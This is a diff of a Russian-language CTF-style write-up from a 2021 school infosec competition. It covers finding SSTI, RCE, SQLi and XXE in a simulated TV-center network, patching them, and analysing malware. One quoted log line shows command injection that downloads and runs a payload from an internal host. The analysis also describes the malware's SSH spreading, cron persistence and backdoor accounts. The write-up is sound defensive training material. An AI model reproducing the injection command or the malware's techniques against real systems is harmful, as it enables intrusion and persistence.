@@ -1,7 +1,9 @@
 #  Инженерная задача по Информационной безопасности НТИ 2021 | Весёлая Ферма
 
 ## Задача
- На финальном мероприятии нам дали задание, суть которого была в том, что нам нужно было защитить подвергшийся атаке телецентр, выявить наибольшее количество уязвимых мест, разработать способы устранения атак, а также найти и обезвредить вредонос. 
+
+ Перед нами стоит задача: есть телецентр, который подвергся хакерской атаке, но у нас нет к нему доступа. Нам надо войти в систему и устранить уязвимости.
+ 
  
 ## Вход во внутреннюю сеть
 
@@ -9,7 +11,13 @@
 
 Сначала было произведено сканирование портов, найдены следующие:
 ```
-| Порт | Прот. | Описание | |——-|——-|——————————————–| | 81 | HTTP | Хостит обфусцированный файл run.py | | 5000 | HTTP | Веб-приложение, сайт провайдера (?) NetGen | | 8037 |      UDP? | Открыт, но не отвечает | | 51515 | TCP | Какой-то сервис, просит пароль |
+PORT STATE SERVICE
+80/tcp | open |
+81/tcp | open | 
+5000/tcp | open |
+8027/tcp | open|
+51515/tcp | open |
+
 ```
 На сервисе NetGen есть страницы /register, /login, /logout Регистрируем пользователя, доступна функция создания тикетов. В параметре POST title обнаружена SSTI (предположительно, Jinja2) Некоторые ключевые слова фильтруются, причем необязательно в составе пейлоада (например, config)
 
@@ -17,7 +25,7 @@
 ![kts](https://user-images.githubusercontent.com/67109334/110940347-cf5fa280-8347-11eb-917d-432bcbc26336.png)
 
 
-### server.py:224 status_route() Possible RCE, weak filter
+###  Удаленное управление команд
 
 #### Решение:
 >Использовать whitelist вместо blacklist, разрешать только опции к команде uptime
@@ -91,11 +99,13 @@
 
 ### :80 server
 
-Это бинарь на  Golang. Let’s try to connect using clientScript.py. The server doesn’t seem to respond to our messages, which means we have to reverse the binary.
+Это бинарь на Golang. Давайте попробуем подключитьс с помощью ```clientScript.py```. Этот сервер, кажется, не отвечает на наши ообщения, это означает, что нам надо зареверсить бинарь.
 
-Используем IDA Free 7.0. Основной код  начинается с main_:
+Давайте использовать IDA Free 7.0. The functions with the code start with main_:
 
-func	description
+#### Описание функции
+
+```
 main.main	init function. Starts the server
 main.server	server func
 main.listAllKeys	lists all keys in the redis db
@@ -105,27 +115,34 @@ main.checkForExistence	checks if the user already exists
 main.createMd5Password	returns random md5 password string
 main.asyncHandleConnections	handles connections
 main.readAndEncode	utility function
-![kts](https://user-images.githubusercontent.com/67109334/110940047-5a8c6880-8347-11eb-9145-a3bff40562fa.png)
-in main.main os.Setenv is called with the arguments ("ADMIN_PASS", "de4ea1a59bb6df9d2f6ddc61cc28ce29"). This is clearly the admin’s password. The envvar is then referenced in main.RedisCreateUsers, which puts admin:ADMIN_PASS into redis db.
+```
 
-Теперь мы можем.
+![kts](https://user-images.githubusercontent.com/67109334/110940047-5a8c6880-8347-11eb-9145-a3bff40562fa.png)
+in main.main os.Setenv is called with the arguments ("ADMIN_PASS", "de4ea1a59bb6df9d2f6ddc61cc28ce29"). 
+Это, очевидно, пароль админа. Это переменное окружение в ```main.RedisCreateUsers```, который отправляет ```admin:ADMIN_PASS``` в ```redis db```.
+
+Теперь мы можем понять, как взаимодействовать с сервером.
 
 ![kts](https://user-images.githubusercontent.com/67109334/110940183-8dcef780-8347-11eb-80f0-e22d9b207303.png)
-main.asyncHandleConnections is a big function, but it is quite easy to understand if you find all the strings used in it, which are:
+main.asyncHandleConnections это большая функция, но если мы найдем строки, используемые в ней, которые: 
 
+```
 ^/register [0-9A-Za-z]{3,8}
 /showall
 /login
 /logout
 /get_screen
-The logic for detecting the last two is not straightforward, so we just had to deduce.
+```
+Логика обнаружения для вычисления последних двух не такая уж простая, поэтому нам остается лишь делать выводы.
+Давайте попробуем.
 
-Let’s try
-
+```
 /login admin de4ea1a59bb6df9d2f6ddc61cc28ce29
 /get_screen
-A very long base64 string is printed. Copying it from terminal doesn’t quite work, so let’s automate the interaction:
+```
+Вывелась очень большая строка base64. Скопировать из терминала не получается, поэтому давайте автоматизируем процесс:
 
+```
 from pwn import remote
 
 r = remote("195.19.98.103", 8037)
@@ -138,13 +155,14 @@ from base64 import b64decode
 
 with open("screeen.jpeg", "wb") as f:
     f.write(b64decode(data))
+```
+
 ![kts](https://user-images.githubusercontent.com/67109334/110940251-a50de500-8347-11eb-8f00-64d13faa5db7.png)
-After running the script we get an image with the instrunction on how to connect to the internal network.
-
-
+После запуска скрипта, мы получаем инструкцию, как подключиться ко всей сети.
 
 
 ### SQLi №2
+
 В ходе тестирования на проникновение «Веселая ферма» смоделировала возможные действия злоумышленника на сайте телецентра “Sirius Game” и выявила возможность проведения атаки типа SQLi. Данная уязвимость даёт злоумышленнику возможность смены пароля любого пользователя, в том числе администратора.
 
 Далее представлена некоторая техническая информация.
@@ -169,3 +187,68 @@ After running the script we get an image with the instrunction on how to connect
 Также мы можем создать скрипт, который автоматически скачивает файлы с сервера и выводит его в консоль.
 
 Патч: изменить параметр в XMLParser.parse() в server.py, который закроет уязвимость
+
+## Минорные патчи
+
+### ?
+
+Пароли в сервисе передавались в открытом виде, что не особо безопасно. Добавил хэширование ```sha256+salt``` в роутах ```/registration, /change_passwd, /login```:
+```
+└─$ diff server_without.py server.py
+13a14
+&gt; salt = 'penetration'
+108c109
+&lt;                 if check_user_password(request.form['login'], request.form['psw']):
+---
+&gt;                 if check_user_password(request.form['login'], hashlib.sha224((request.form['psw']+salt).encode()).hexdigest()):
+136c137
+&lt;                 change_user_passwd(request.cookies.get('session'), request.form['psw'])
+---
+&gt;                 change_user_passwd(request.cookies.get('session'), hashlib.sha224((request.form['psw']+salt).encode()).hexdigest())
+319c320
+&lt;     user = (data.get('login'), data.get('psw'), data.get('first_name'), data.get('second_name'), data.get('last_name'), data.get('position'))
+---
+&gt;     user = (data.get('login'), hashlib.sha224((data.get('psw')+salt).encode()).hexdigest(), data.get('first_name'), data.get('second_name'), data.get('last_name'), data.get('position'))
+```
+
+### Контроль доступа 
+
+Неавторизированному пользователю не должна быть доступна служебная информация. Это может быть использовано для разведки и сбора информации о юзерах для дальнейшего вторжения. Добавил в начало функции ```staff_route``` проверку на авторизованность, для того чтобы скрыть информацию о пользователях от неавторизированных посетителей
+
+```
+@app.route("/staff", methods=["GET"])
+def staff_route():
+    try:
+        username = get_user_info(request.cookies.get('session'))[1]
+    except:
+        return redirect("/login")
+...
+```
+
+## Расследование атаки
+
+### Вредонос
+
+В ходе мониторинга веб-сервера были обнаружены следующие запросы:
+
+```10.1.2.15 - - [12/Mar/2021 16:30:03] "GET /status?q=1;wget%20http%3A%2F%2F10.1.76.31%2Fupdate%20-O%20%2Ftmp%2Fupdate%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Fupdate%20%26%26%20cd%20%2Ftmp%20%26%26%20.%2Fupdate%20%26%26%20rm%20%2Ftmp%2Fupdate HTTP/1.1" 200``` -
+Это запрос к ```/status```, в которой ранее была обнаружена уязвимость RCE.
+
+Скачаем файл. При открытии ничего не понятно, но на самом деле это достаточно простая обертка. Строки вида ```$@$@$@$@$@...``` на самом деле ничего не значат, но внутри них посимвольно записаны команды echo ```'...' | base64 -d | bash```. Получается, большая base64-строка – это собственно вредоносный скрипт.
+
+Декодируем строку, получается скрипт. Заменим точки с запятой на переводы строк, получим немного более читаемый скрипт. Названия функций и переменных обфусцированны, также содержание строк зашифровано. Расшифруем строки, чтобы понять, что в них содерижтся – по сожержимому установим понятные названия для переменных. Шифрование простое: символы просто смещаются на 1 вперед ```(a -> b)```.
+
+Можно заметить в строках две команды, которые скачивают из запускают еще файлы. ```doker-proxy``` – бинарный вредоносный файл, видимо связан с ```docker```, ```update``` – сам вредоносный скрипт.
+
+Изучим две функции внизу.
+
+Первая, как видно по достаточно читаемому коду, подключается по ssh к каждому из известных IP в ```~/.ssh/known_hosts``` и выполняет скрипт – значит, скрипт помимо вредоносных действий заражает известные компьютеры. Защититься можно, используя парольные фразы для приватных ключей – скрипт не сможет запросить ввод пароля от пользователя, а значит и воспользоваться ключами.
+
+Далее скрипт скачивает файл ```doker-proxy``` и запускает его в фоновом режиме (анализ см. позже). Затем скрипт добавляет в cron правило, по которому он будет скачитваться и запускаться с некоторой периодичностью (чтобы после удаления скрипт снова попал в систему).
+
+Если скрипт запускается с правами суперпользователя, удаляются все учетные записи, имеющие распространённые навзания (например, www). Затем с помощью скриптов на **pastebin.com** добавляются два пользователя с домашней папкой ```/root``` и определенной записью в ```/etc/shadow```.
+
+Затем скрипт удаляет оставшиеся файлы и завершает работу.
+
+#### Исправление
+>Уязвимость, позволявшая загрузить и выполнить скрипт была закрыта. Теперь остаётся удалить правило в ```cron``` и остановить вредоносные процессы.
